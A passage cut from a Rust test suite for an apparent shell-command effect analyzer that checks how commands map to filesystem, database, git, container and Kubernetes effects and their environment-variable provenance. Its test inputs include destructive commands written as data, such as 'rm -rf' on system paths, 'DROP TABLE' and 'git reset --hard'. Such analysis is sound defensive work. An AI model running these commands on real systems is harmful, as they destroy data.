            ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == "/home/test/out/**"
        ));
        assert!(provenance_reaches(
            &plan,
            &write.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }
}

#[test]
fn archive_destination_without_context_keeps_command_provenance() {
    for source in ["tar -xf bundle.tar -C ~/.nah", "unzip bundle.zip -d out"] {
        let plan = shell(source, Some("/work"));
        let write = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.write")
            .unwrap();
        assert!(write.provenance.iter().any(|reference| matches!(
            plan.provenance[reference.0 as usize].kind,
            ProvenanceKind::Argument { index: 0 }
        )));
    }
}

#[test]
fn cwd_anchored_git_resource_cites_changed_cwd() {
    let plan = shell_with_env("cd ~; git reset --hard", &[("HOME", "/home/test")]);
    let discard = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard")
        .unwrap();
    assert!(matches!(
        &discard.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::GitRepository { worktree: Some(worktree), .. }
        } if matches!(
            worktree.as_ref(),
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == "/home/test"
        )
    ));
    assert!(provenance_reaches(
        &plan,
        &discard.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));

    let plan = shell_with_env("cd ~; git -C /repo reset --hard", &[("HOME", "/home/test")]);
    let discard = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "git.worktree_discard")
        .unwrap();
    assert!(matches!(
        &discard.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::GitRepository { worktree: Some(worktree), .. }
        } if matches!(
            worktree.as_ref(),
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == "/repo"
        )
    ));
    assert!(!provenance_reaches(
        &plan,
        &discard.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn explicit_git_repository_cites_host_context_input() {
    for source in [
        "git -C \"$HOME/repo\" reset --hard",
        "git -C \"$HOME/repo\" checkout -- /tmp/file",
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let discard = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "git.worktree_discard")
            .unwrap();
        assert!(matches!(
            &discard.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::GitRepository { worktree: Some(worktree), .. }
            } if matches!(
                worktree.as_ref(),
                ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                    if path == "/home/test/repo"
            )
        ));
        assert!(provenance_reaches(
            &plan,
            &discard.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }
}

#[test]
fn derived_wget_output_cites_host_context_input() {
    let plan = shell_with_env(
        "wget -O \"$HOME/out\" https://example.com/file",
        &[("HOME", "/home/test")],
    );
    let write = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.write")
        .unwrap();
    assert!(matches!(
        &write.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/out"
    ));
    assert!(provenance_reaches(
        &plan,
        &write.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn container_bind_mount_cites_host_context_input() {
    let plan = shell_with_env(
        "docker run -v \"$HOME:/data\" alpine true",
        &[("HOME", "/home/test")],
    );
    let run = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "container.run")
        .unwrap();
    assert!(matches!(
        &run.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::Container { storage, .. }
        } if matches!(
            storage.as_slice(),
            [effinterp_proto::ContainerStorage::BindMount { host_path, .. }]
                if matches!(
                    host_path,
                    ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path }
                    } if path == "/home/test"
                )
        )
    ));
    assert!(provenance_reaches(
        &plan,
        &run.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn container_name_cites_host_context_input() {
    for source in [
        "docker run --name \"$NAME\" alpine true",
        "docker run --name=\"$NAME\" alpine true",
    ] {
        let plan = shell_with_env(source, &[("NAME", "ctx-name")]);
        let run = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "container.run")
            .unwrap();
        assert!(matches!(
            &run.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::Container { name, .. }
            } if name.as_deref() == Some("ctx-name")
        ));
        assert!(provenance_reaches(
            &plan,
            &run.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "NAME")
        ));
    }
}

#[test]
fn sql_connection_fields_cite_host_context_inputs() {
    for source in [
        "psql -h \"$HOST\" -p \"$PORT\" -d \"$DB\" -c 'DROP TABLE t'",
        "mysql -h \"$HOST\" -P \"$PORT\" -D \"$DB\" -e 'DROP TABLE t'",
    ] {
        let plan = shell_with_env(
            source,
            &[("HOST", "db.example"), ("PORT", "5432"), ("DB", "mydb")],
        );
        let connect = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "network.connect")
            .unwrap();
        assert!(matches!(
            &connect.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::NetworkEndpoint { host, port, .. }
            } if host == "db.example" && *port == Some(5432)
        ));
        for name in ["HOST", "PORT"] {
            assert!(provenance_reaches(
                &plan,
                &connect.provenance,
                |kind| matches!(kind, ProvenanceKind::HostContext { name: actual } if actual == name)
            ));
        }

        let drop = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "database.schema_drop")
            .unwrap();
        assert!(matches!(
            &drop.resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::DatabaseTable {
                    server,
                    database,
                    ..
                }
            } if server.as_deref() == Some("db.example")
                && database.as_deref() == Some("mydb")
        ));
        for name in ["HOST", "DB"] {
            assert!(provenance_reaches(
                &plan,
                &drop.provenance,
                |kind| matches!(kind, ProvenanceKind::HostContext { name: actual } if actual == name)
            ));
        }

        let execution = plan
            .execution_graph
            .nodes
            .iter()
            .find(|node| matches!(node.subject, Subject::Sql { .. }))
            .unwrap();
        for name in ["HOST", "DB"] {
            assert!(provenance_reaches(
                &plan,
                &execution.evidence,
                |kind| matches!(kind, ProvenanceKind::HostContext { name: actual } if actual == name)
            ));
        }
    }
}

#[test]
fn database_dump_and_sqlite_cite_host_context_inputs() {
    let plan = shell_with_env(
        "pg_dump -h \"$HOST\" \"$DB\"",
        &[("HOST", "db.example"), ("DB", "prod")],
    );
    let connect = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "network.connect")
        .unwrap();
    assert!(matches!(
        &connect.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint { host, .. }
        } if host == "db.example"
    ));
    assert!(provenance_reaches(
        &plan,
        &connect.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOST")
    ));

    let read = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "database.read")
        .unwrap();
    assert!(matches!(
        &read.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::DatabaseSchema {
                server,
                database,
                ..
            }
        } if server.as_deref() == Some("db.example") && database.as_deref() == Some("prod")
    ));
    for name in ["HOST", "DB"] {
        assert!(provenance_reaches(
            &plan,
            &read.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name: actual } if actual == name)
        ));
    }

    let plan = shell_with_env(
        "sqlite3 \"$DB\" 'DROP TABLE t'",
        &[("DB", "/home/test/db.sqlite")],
    );
    let drop = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "database.schema_drop")
        .unwrap();
    assert!(matches!(
        &drop.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::DatabaseTable { database, .. }
        } if database.as_deref() == Some("/home/test/db.sqlite")
    ));
    assert!(provenance_reaches(
        &plan,
        &drop.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "DB")
    ));
}

#[test]
fn git_remote_endpoint_cites_host_context_input() {
    let plan = shell_with_env("git push \"$URL\"", &[("URL", "https://git.example/repo")]);
    let upload = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "network.upload")
        .unwrap();
    assert!(matches!(
        &upload.resource,
        ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint { host, path, .. }
        } if host == "git.example" && path.as_deref() == Some("/repo")
    ));
    assert!(provenance_reaches(
        &plan,
        &upload.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "URL")
    ));
}

#[test]
fn declarative_attribute_cites_host_context_input() {
    let plan = shell_with_env("chmod \"$MODE\" /tmp/x", &[("MODE", "0777")]);
    let metadata = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.metadata")
        .unwrap();
    assert_eq!(
        metadata.attributes.get("spec"),
        Some(&AttrValue::String("0777".to_string()))
    );
    assert!(provenance_reaches(
        &plan,
        &metadata.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "MODE")
    ));

    let plan = shell_with_env("rm \"$RECURSIVE\" /tmp/x", &[("RECURSIVE", "-r")]);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert_eq!(
        delete.attributes.get("recursive"),
        Some(&AttrValue::Bool(true))
    );
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "RECURSIVE")
    ));
}

#[test]
fn nested_container_realm_cites_host_context_input() {
    for (source, context_name, realm_name) in [
        ("docker run \"$IMAGE\" rm -rf /tmp/x", "IMAGE", "ctx-image"),
        (
            "docker exec \"$CONTAINER\" rm -rf /tmp/x",
            "CONTAINER",
            "ctx-container",
        ),
    ] {
        let plan = shell_with_env(source, &[(context_name, realm_name)]);
        let delete = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.delete"
                    && matches!(
                        &effect.realm,
                        ExecutionRealm::Container { name, .. } if name == realm_name
                    )
            })
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == context_name)
        ));
        let process = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "process.exec"
                    && matches!(
                        &effect.realm,
                        ExecutionRealm::Container { name, .. } if name == realm_name
                    )
            })
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &process.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == context_name)
        ));
        let execution = plan
            .execution_graph
            .nodes
            .iter()
            .find(|node| {
                matches!(
                    &node.realm,
                    ExecutionRealm::Container { name, .. } if name == realm_name
                ) && matches!(
                    &node.subject,
                    Subject::Exec { argv, .. }
                        if argv.first().is_some_and(|arg| arg == "rm")
                )
            })
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &execution.evidence,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == context_name)
        ));
    }
}

#[test]
fn nested_kubernetes_realm_cites_host_context_inputs() {
    let plan = shell_with_env(
        "kubectl -n \"$NAMESPACE\" exec \"$POD\" -c \"$CONTAINER\" -- rm -rf /tmp/x",
        &[
            ("NAMESPACE", "ctx-namespace"),
            ("POD", "ctx-pod"),
            ("CONTAINER", "ctx-container"),
        ],
    );
    let delete = plan
        .effects
        .iter()
        .find(|effect| {
            effect.operation.0 == "filesystem.delete"
                && matches!(
                    &effect.realm,
                    ExecutionRealm::Kubernetes {
                        namespace,
                        pod,
                        container,
                    } if namespace.as_deref() == Some("ctx-namespace")
                        && pod == "ctx-pod"
                        && container.as_deref() == Some("ctx-container")
                )
        })
        .unwrap();
    for name in ["NAMESPACE", "POD", "CONTAINER"] {
        assert!(provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name: actual } if actual == name)
        ));
    }
    let process = plan
        .effects
        .iter()
        .find(|effect| {
            effect.operation.0 == "process.exec"
                && matches!(effect.realm, ExecutionRealm::Kubernetes { .. })
        })
        .unwrap();
    for name in ["NAMESPACE", "POD", "CONTAINER"] {
        assert!(provenance_reaches(
            &plan,
            &process.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name: actual } if actual == name)
        ));
    }
    let execution = plan
        .execution_graph
        .nodes
        .iter()
        .find(|node| {
            matches!(node.realm, ExecutionRealm::Kubernetes { .. })
                && matches!(
                    &node.subject,
                    Subject::Exec { argv, .. }
                        if argv.first().is_some_and(|arg| arg == "rm")
                )
        })
        .unwrap();
    for name in ["NAMESPACE", "POD", "CONTAINER"] {
        assert!(provenance_reaches(
            &plan,
            &execution.evidence,
            |kind| matches!(kind, ProvenanceKind::HostContext { name: actual } if actual == name)
        ));
    }
}

#[test]
fn kubectl_exec_preserves_symbolic_realm_identity() {
    let cases = [
        ("kubectl exec $POD -- rm -rf /data", None, None),
        (
            "kubectl -n $NS exec -it $POD -- rm -rf /data",
            Some("$NS"),
            None,
        ),
        (
            "kubectl exec -c \"$C\" $POD -- rm -rf /data",
            None,
            Some("$C"),
        ),
    ];
    for (source, namespace, container) in cases {
        let plan = shell(source, None);
        let deletes: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .collect();
        assert_eq!(deletes.len(), 1);
        assert_eq!(
            deletes[0].realm,
            ExecutionRealm::Kubernetes {
                namespace: namespace.map(str::to_string),
                pod: "$POD".to_string(),
                container: container.map(str::to_string),
            }
        );
        assert!(
            !plan
                .boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unrecognized_arguments")
        );
        assert_eq!(
            effinterp_proto::canonical_json(&plan),
            effinterp_proto::canonical_json(&shell(source, None))
        );
    }
}

#[test]
fn container_workdir_cites_host_context_input() {
    let plan = shell_with_env(
        "docker run -w \"$HOME/work\" alpine rm -rf .",
        &[("HOME", "/home/test")],
    );
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/home/test/work"
    ));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
    let execution = plan
        .execution_graph
        .nodes
        .iter()
        .find(|node| {
            matches!(node.realm, ExecutionRealm::Container { .. })
                && matches!(
                    &node.subject,
                    Subject::Exec { argv, cwd, .. }
                        if argv.first().is_some_and(|arg| arg == "rm")
                            && cwd.as_deref() == Some("/home/test/work")
                )
        })
        .unwrap();
    assert!(provenance_reaches(
        &plan,
        &execution.evidence,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn absolute_filesystem_operand_ignores_sibling_host_context() {
    for source in [
        "cp \"$HOME/input\" /tmp/out",
        "sudo cp \"$HOME/input\" /tmp/out",
        "find /tmp -exec cp \"$HOME/input\" /tmp/out \\;",
        "strace cp \"$HOME/input\" /tmp/out",
        "start-stop-daemon --start --exec cp -- \"$HOME/input\" /tmp/out",
        "docker run --entrypoint cp alpine \"$HOME/input\" /tmp/out",
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let read = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "filesystem.read"
                    && matches!(
                        &effect.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::FsPath { path }
                        } if path == "/home/test/input"
                    )
            })
            .unwrap();
        let write = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.write")
            .unwrap();
        let process = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "process.exec"
                    && matches!(
                        &effect.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::Process { executable, .. }
                        } if executable == "cp"
                    )
            })
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &read.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
        assert!(!provenance_reaches(
            &plan,
            &write.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
        assert!(provenance_reaches(
            &plan,
            &process.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }
}

#[test]
fn synthesized_nested_argv_preserves_host_context_provenance() {
    for source in [
        "strace rm -rf \"$HOME/input\"",
        "start-stop-daemon --start --exec rm -- -rf \"$HOME/input\"",
        "docker run --entrypoint rm alpine -rf \"$HOME/input\"",
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(matches!(
            &delete.resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == "/home/test/input"
        ));
        assert!(provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));

        let execution = plan
            .execution_graph
            .nodes
            .iter()
            .find(|node| {
                matches!(
                    &node.subject,
                    Subject::Exec { argv, .. }
                        if argv.first().is_some_and(|arg| arg == "rm")
                )
            })
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &execution.evidence,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }
}

#[test]
fn language_subprocesses_preserve_cwd_host_context_provenance() {
    for source in [
        "cd \"$HOME\"; python -c 'import subprocess; subprocess.run([\"rm\", \"-rf\", \".\"])'",
        "cd \"$HOME\"; node -e 'require(\"child_process\").execFileSync(\"rm\", [\"-rf\", \".\"])'",
    ] {
        let plan = shell_with_env(source, &[("HOME", "/home/test")]);
        let delete = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert!(matches!(
            &delete.resource,
            ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
                if path == "/home/test"
        ));
        assert!(provenance_reaches(
            &plan,
            &delete.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));

        let process = plan
            .effects
            .iter()
            .find(|effect| {
                effect.operation.0 == "process.exec"
                    && matches!(
                        &effect.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::Process { executable, cwd, .. }
                        } if executable == "rm"
                            && matches!(cwd.as_deref(), Some(ResourceExpr::Concrete {
                                identity: ResourceIdentity::FsPath { path }
                            }) if path == "/home/test")
                    )
            })
            .unwrap();
        assert!(provenance_reaches(
            &plan,
            &process.provenance,
            |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
        ));
    }

    let plan = shell_with_env(
        "cd \"$HOME\"; python -c 'import subprocess; subprocess.run(\"rm -rf .\", shell=True, cwd=\"/tmp\")'",
        &[("HOME", "/home/test")],
    );
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(
        &delete.resource,
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/tmp"
    ));
    assert!(!provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn find_match_provenance_reaches_host_context() {
    for root in ["/tmp/[ab]", r"/tmp/a\b"] {
        let plan = shell_with_env("find ~ -exec chown root '{}' +", &[("HOME", root)]);
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.metadata"
                && matches!(&effect.resource, ResourceExpr::Union { alternatives }
                    if alternatives.iter().any(|resource| matches!(resource,
                        ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } }
                            if effinterp_proto::glob_match(pattern, &format!("{root}/.hidden/x")) == Ok(true))))
        }), "{root}: {:?}", plan.effects);
    }

    let plan = shell_with_env("find ~ -exec chown root '{}' +", &[("HOME", "/home/test")]);
    let metadata = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.metadata")
        .unwrap();
    assert!(provenance_reaches(
        &plan,
        &metadata.provenance,
        |kind| matches!(kind, ProvenanceKind::HostContext { name } if name == "HOME")
    ));
}

#[test]
fn unresolved_directory_change_preserves_environment_dependency() {
    let source = "cd \"$UNKNOWN\"; rm -rf y";
    let plan = shell(source, None);
    let delete = plan
        .effects
        .iter()
        .find(|effect| effect.operation.0 == "filesystem.delete")
        .unwrap();
    assert!(matches!(&delete.resource, ResourceExpr::Join { parts }
        if matches!(parts.first(), Some(ResourceExpr::Environment { name }) if name == "UNKNOWN")));
    assert!(provenance_reaches(
        &plan,
        &delete.provenance,
        |kind| matches!(kind, ProvenanceKind::SourceSpan { start: 3, end: 13 })
    ));
}

#[test]
fn filesystem_operands_follow_the_cwd_path_platform() {
    for (cwd, operand, expected) in [
        (r"C:\repo", "D:/victim", Some("D:/victim")),
        (r"C:\repo", r"D:\victim", Some("D:/victim")),
        (r"C:\repo", "d:", Some("D:")),
        (
            r"C:\repo",
            "//server/share/victim",
            Some("//server/share/victim"),
        ),
        (
            r"C:\repo",
            r"\\server\share\victim",
            Some("//server/share/victim"),
        ),
        (r"C:\repo", "D:victim", None),
        (r"\\server\share\repo", "D:/victim", Some("D:/victim")),
    ] {
        let plan = shell(&format!("rm -rf -- '{operand}'"), Some(cwd));
        let resource = delete_resources(&plan)[0];
        match expected {
            Some(expected) => assert!(
                matches!(resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == expected),
                "{operand}: {resource:?}"
            ),
            None => assert!(
                matches!(resource, ResourceExpr::Unresolved { .. }),
                "{operand}: {resource:?}"
            ),
        }
    }

    let plan = shell("rm -rf -- D:/victim", Some("/repo"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/repo/D:/victim"
    ));

    for (target, expected) in [
        ("D:/other", Some("D:/other/foo")),
        (r"D:\other", Some("D:/other/foo")),
        ("//server/share/other", Some("//server/share/other/foo")),
        (r"\\server\share\other", Some("//server/share/other/foo")),
        ("D:victim", None),
    ] {
        let plan = shell(&format!("cd '{target}'; rm -rf -- foo"), Some(r"C:\repo"));
        let resource = delete_resources(&plan)[0];
        match expected {
            Some(expected) => assert!(
                matches!(resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == expected),
                "{target}: {resource:?}"
            ),
            None => {
                assert!(
                    matches!(resource, ResourceExpr::Join { parts }
                        if matches!(parts.first(), Some(ResourceExpr::Unresolved { .. }))),
                    "{target}: {resource:?}"
                );
                let execution = plan
                    .execution_graph
                    .nodes
                    .iter()
                    .find(|node| {
                        matches!(&node.subject, Subject::Exec { argv, .. }
                            if argv.first().is_some_and(|head| head == "rm"))
                    })
                    .unwrap();
                assert!(
                    matches!(&execution.cwd, Some(ResourceExpr::Unresolved { .. })),
                    "{target}: {:?}",
                    execution.cwd
                );
                assert!(
                    matches!(&execution.subject, Subject::Exec { cwd: None, .. }),
                    "{target}: {:?}",
                    execution.subject
                );
            }
        }
    }

    let plan = shell("cd D:/other; rm -rf -- foo", Some("/repo"));
    assert!(matches!(
        delete_resources(&plan)[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/repo/D:/other/foo"
    ));
}

fn ops(plan: &Plan) -> Vec<&str> {
    plan.effects
        .iter()
        .map(|e| e.operation.0.as_str())
        .collect()
}

fn delete_resources(plan: &Plan) -> Vec<&ResourceExpr> {
    plan.effects
        .iter()
        .filter(|e| e.operation.0 == "filesystem.delete")
        .map(|e| &e.resource)
        .collect()
}

fn exec_argv<'a>(plan: &'a Plan, executable: &str) -> &'a [String] {
    plan.execution_graph
        .nodes
        .iter()
        .find_map(|node| match &node.subject {
            Subject::Exec { argv, .. } if argv.first().is_some_and(|head| head == executable) => {
                Some(argv.as_slice())
            }
            _ => None,
        })
        .unwrap_or_else(|| panic!("missing execution for {executable:?}"))
}

#[test]
fn combined_shell_flags_select_the_inline_script() {
    for source in [
        "bash -lc 'rm -rf /tmp/y'",
        "sh -lc 'rm -rf /tmp/y'",
        "bash -euo pipefail -c 'rm -rf /tmp/y'",
        "bash -xec 'rm -rf /tmp/y'",
        "zsh -ic 'rm -rf /tmp/y'",
        "sh -exc 'rm -rf /tmp/y'",
        "bash -o pipefail -lc 'rm -rf /tmp/y'",
        "bash -l -c 'rm -rf /tmp/y'",
    ] {
        let plan = shell(source, None);
        assert!(
            if source.starts_with("bash ") {
                plan.execution_graph.nodes.iter().any(|node| {
                    node.input.as_ref().is_some_and(|input| {
                        input.phase == effinterp_proto::ExecutionPhase::Startup
                    })
                })
            } else {
                plan.boundaries.is_empty()
            },
            "{source}: {:?}",
            plan.boundaries
        );

        let deletes = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "filesystem.delete")
            .collect::<Vec<_>>();
        assert_eq!(deletes.len(), 1, "{source}: {:?}", plan.effects);
        assert!(matches!(
            &deletes[0].resource,
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath { path }
            } if path == "/tmp/y"
        ));
        assert_eq!(
            deletes[0].attributes.get("force"),
            Some(&AttrValue::Bool(true)),
            "{source}"
        );
        assert_eq!(
            deletes[0].attributes.get("recursive"),
            Some(&AttrValue::Bool(true)),
            "{source}"
        );
        assert!(
            plan.effects.iter().any(|effect| {
                effect.operation.0 == "process.exec"
                    && matches!(
                        &effect.resource,
                        ResourceExpr::Concrete {
                            identity: ResourceIdentity::Process { executable, argv, .. }
                        } if executable == "rm"
                            && matches!(argv.as_slice(), [
                                ResourceExpr::Literal { value: flag },
                                ResourceExpr::Literal { value: path }
                            ] if flag == "-rf" && path == "/tmp/y")
                    )
            }),
            "{source}: {:?}",
            plan.effects
        );
        assert_eq!(
            plan.coverage
                .0
                .get(&Domain::new("filesystem"))
                .map(|claim| &claim.level),
            Some(&if source.starts_with("bash ") {
                CoverageLevel::Partial
            } else {
                CoverageLevel::Full
            }),
            "{source}"
        );
        assert_eq!(
            plan.coverage
                .0
                .get(&Domain::new("process"))
                .map(|claim| &claim.level),
            Some(&if source.starts_with("bash ") {
                CoverageLevel::Partial
            } else {
                CoverageLevel::Full
            }),
            "{source}"
        );
    }
}

#[test]
fn shells_without_inline_source_remain_opaque() {
    for source in ["bash -l", "bash script.sh"] {
        let plan = shell(source, None);
        assert!(
            plan.boundaries
                .iter()
                .any(|boundary| boundary.reason.as_str() == "unrecoverable_source"),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(delete_resources(&plan).is_empty(), "{source}");
    }

    assert!(delete_resources(&shell("bash -lc", None)).is_empty());
}

#[test]
fn simple_command_flows_through_exec_frontend() {
    let plan = shell("rm -rf ./cache", Some("/work/repo"));
    assert_eq!(plan.execution_graph.nodes.len(), 2);
    assert!(plan.execution_graph.nodes[1].boundary.is_none());
    assert!(matches!(
        &plan.execution_graph.nodes[1].subject,
        Subject::Exec { argv, cwd, .. } if argv == &["rm", "-rf", "./cache"]
            && cwd.as_deref() == Some("/work/repo")
    ));
    let resources = delete_resources(&plan);
    assert!(matches!(
        resources[0],
        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } }
            if path == "/work/repo/cache"
    ));
    assert!(plan.boundaries.is_empty());
}

#[test]
fn symbolic_head_analyzes_a_modeled_tail_as_a_likely_wrapper() {
    let plan = shell("${SUDO:-} rm -rf /var/lib/app", None);
    assert_eq!(
        ops(&plan),
        [
            "environment.read",
            "process.exec",
            "process.exec",
            "filesystem.delete",
        ]
    );

    let unresolved_head = plan
        .effects
        .iter()
        .find(|effect| {
            effect.operation.0 == "process.exec"
                && matches!(effect.resource, ResourceExpr::Unresolved { .. })
        })
        .unwrap();
    assert!(unresolved_head.condition.is_none());
    let conditioned = plan
        .effects
        .iter()
        .filter(|effect| effect.condition.is_some())
        .collect::<Vec<_>>();
    assert_eq!(conditioned.len(), 2);
    for effect in conditioned {
        assert!(matches!(
            effect.operation.0.as_str(),
            "process.exec" | "filesystem.delete"
        ));
        assert!(effect.condition.as_ref().is_some_and(|condition| {
            condition
                .atoms()
                .iter()
                .any(|a| a.origin.kind == effinterp_proto::ConditionKind::UnresolvedExecution)
        }));
    }

    let boundary = &plan.boundaries[0];
    assert_eq!(boundary.reason.as_str(), "unresolved_command");
    assert_eq!(boundary.class, BoundaryClass::Unresolved);
    assert_eq!(
        boundary.domains,
        [Domain::new("process"), Domain::new("dataflow")]
    );
    assert_eq!(
        plan.coverage.0[&Domain::new("process")].level,
        CoverageLevel::Partial
    );
    assert_eq!(
        plan.coverage.0[&Domain::new("filesystem")].level,
        CoverageLevel::Full
    );

    let head = plan
        .execution_graph
        .nodes
        .iter()
        .position(|node| node.boundary.is_some())
        .unwrap();
    let tail = plan
        .execution_graph
        .nodes
        .iter()
        .position(|node| {
            matches!(&node.subject, Subject::Exec { argv, .. } if argv == &["rm", "-rf", "/var/lib/app"])
        })
        .unwrap();
    assert_ne!(
        plan.execution_graph.nodes[head].assurance,
        ExecutionAssurance::Exact
    );
    assert!(plan.execution_graph.edges.iter().any(|edge| {
        edge.from.0 as usize == head
            && edge.to.0 as usize == tail
            && edge.kind == ExecutionEdgeKind::Launch
    }));
}

#[test]
fn symbolic_head_keeps_non_command_tails_opaque() {
    for source in [
        "$PYTHON -m pip install x",
        "${MAKE} -C build clean",
        "$CC -o out main.c",
        "$PYTHON setup.py install",
        "$SUDO $CC -o out main.c",
    ] {
        let plan = shell(source, None);
        assert!(delete_resources(&plan).is_empty(), "{source}");
        assert_eq!(plan.boundaries.len(), 1, "{source}");
        assert_eq!(
